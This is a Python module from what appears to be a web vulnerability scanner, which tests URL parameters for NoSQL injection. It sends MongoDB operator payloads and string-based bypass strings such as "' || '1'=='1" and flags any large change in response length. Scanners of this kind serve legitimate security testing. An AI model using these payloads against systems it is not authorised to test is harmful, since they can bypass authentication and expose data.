"""
NoSQL Injection Detection Module
OWASP A03:2021 - Injection
"""

import requests
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import json
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.payload_loader import payload_loader


class NoSQLInjectionModule:
    def __init__(self, target_url: str, custom_payloads: List[str] = None, http_client: Any = None):
        self.target_url = target_url
        
        # Inject custom HttpClient if provided
        if http_client:
            self.http = http_client
        else:
            import requests as r
            self.http = r
        
        # MongoDB injection payloads
        self.mongodb_payloads = [
            {"$ne": None},
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$or": [{"a": "a"}, {"a": "a"}]},
        ]
        
        # String-based NoSQL injection
        default_payloads = [
            "' || '1'=='1",
            "' || 1==1//",
            "admin' || 'a'=='a",
            "' || true || '",
            "'; return true; var foo='",
        ]
        
        self.payloads = payload_loader.merge_with_defaults(
            default_payloads,
            custom_payloads or []
        )
        
    def test_nosql_injection(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Test for NoSQL injection"""
        findings = []
        
        try:
            # Get baseline
            baseline = self.http.get(url, timeout=10)
            baseline_length = len(baseline.text)
            
            # Test MongoDB operator injection
            for payload in self.mongodb_payloads:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # Try as JSON in parameter
                params[param] = [json.dumps(payload)]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                
                response = self.http.get(test_url, timeout=10)
                
                # Check for different response
                if abs(len(response.text) - baseline_length) > 100:
                    findings.append({
                        "name": "NoSQL Injection (MongoDB)",
                        "vulnerability_type": "nosql_injection",
                        "severity": "critical",
                        "owasp_category": "A03:2021",
                        "url": url,
                        "parameter": param,
                        "confidence": 75,
                        "technique": "Operator Injection",
                        "evidence": {
                            "payload": json.dumps(payload),
                            "baseline_length": baseline_length,
                            "response_length": len(response.text)
                        },
                        "poc": f"curl -X GET \"{test_url}\"",
                        "remediation": "Use parameterized queries and validate input types"
                    })
                    break
                    
            # Test string-based injection
            for payload in self.payloads:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                
                response = self.http.get(test_url, timeout=10)
                
                if abs(len(response.text) - baseline_length) > 100:
                    findings.append({
                        "name": "NoSQL Injection (String-based)",
                        "vulnerability_type": "nosql_injection",
                        "severity": "critical",
                        "owasp_category": "A03:2021",
                        "url": url,
                        "parameter": param,
                        "confidence": 70,
                        "technique": "String Injection",
                        "evidence": {
                            "payload": payload,
                            "baseline_length": baseline_length,
                            "response_length": len(response.text)
                        },
                        "poc": f"curl -X GET \"{test_url}\"",
                        "remediation": "Sanitize input and use ORM/ODM with built-in protection"
                    })
                    break
                    
        except Exception as e:
            print(f"Error testing NoSQL injection: {str(e)}")
            
        return findings
        
    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan for NoSQL injection vulnerabilities"""
        all_findings = []
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                findings = self.test_nosql_injection(url, param)
                all_findings.extend(findings)
                
        return all_findings
